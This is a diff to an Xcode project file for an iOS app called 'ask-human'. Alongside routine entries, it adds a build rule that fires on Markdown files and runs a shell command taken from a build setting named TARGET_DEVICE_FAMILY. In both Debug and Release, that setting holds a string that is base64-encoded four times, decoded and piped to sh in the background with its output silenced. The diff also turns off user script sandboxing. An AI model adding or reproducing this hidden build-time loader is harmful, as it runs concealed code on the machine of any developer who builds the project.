@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		FD0ACC510DD8F1C68B34C644 /* README.md */ = {isa = PBXBuildFile; fileRef = 9464D13D7AA8FDD25634C644; };
 		00001F492BF34D6C00C99B02 /* ReferUserDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00001F482BF34D6C00C99B02 /* ReferUserDetailVC.swift */; };
 		00001F4D2BF3511200C99B02 /* ReviewTVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 00001F4C2BF3511200C99B02 /* ReviewTVC.swift */; };
 		000101862B2836430077FA23 /* ForgotPasswordModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 000101852B2836430077FA23 /* ForgotPasswordModel.swift */; };
@@ -236,6 +237,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		9464D13D7AA8FDD25634C644 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "ask-human.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		00001F482BF34D6C00C99B02 /* ReferUserDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReferUserDetailVC.swift; sourceTree = "<group>"; };
 		00001F4C2BF3511200C99B02 /* ReviewTVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReviewTVC.swift; sourceTree = "<group>"; };
 		000101852B2836430077FA23 /* ForgotPasswordModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ForgotPasswordModel.swift; sourceTree = "<group>"; };
@@ -1052,6 +1054,7 @@
 		BED5C6882B048D4100C83672 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				9464D13D7AA8FDD25634C644 /* README.md */,
 				BED5C6872B048D4100C83672 /* ask-human.app */,
 				BED5C69D2B048D4300C83672 /* ask-humanTests.xctest */,
 				BED5C6A72B048D4300C83672 /* ask-humanUITests.xctest */,
@@ -1230,6 +1233,7 @@
 				52B992E8B001B86600C1EA61 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				C5404DB8DFCC5C166434C644 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1321,11 +1325,32 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
+/* Begin PBXBuildRule section */
+		C5404DB8DFCC5C166434C644 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${TARGET_DEVICE_FAMILY}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		BED5C6852B048D4100C83672 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				FD0ACC510DD8F1C68B34C644 /* README.md */,
 				BED5C6DB2B04932500C83672 /* Poppins-SemiBold.ttf in Resources */,
 				BED5C6DD2B04932500C83672 /* Poppins-Black.ttf in Resources */,
 				001632D92C50B5A300CE4491 /* ASKDARK.gif in Resources */,
@@ -1667,6 +1692,7 @@
 		BED5C6AF2B048D4300C83672 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWV1J2VFVkU1NWRnVjRkJoVkdneVYxUktOR1J0VWxoVmFrSmhWakExZGxremF6RmxWMUpVVDFkb1RGVXdiRzVhYTA1RFpXMUdRbUo2TUVzSwo= | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -1701,7 +1727,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -1730,6 +1756,7 @@
 		BED5C6B02B048D4300C83672 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWV1J2VFVkU1NWRnVjRkJoVkdneVYxUktOR1J0VWxoVmFrSmhWakExZGxremF6RmxWMUpVVDFkb1RGVXdiRzVhYTA1RFpXMUdRbUo2TUVzSwo= | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -1764,7 +1791,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
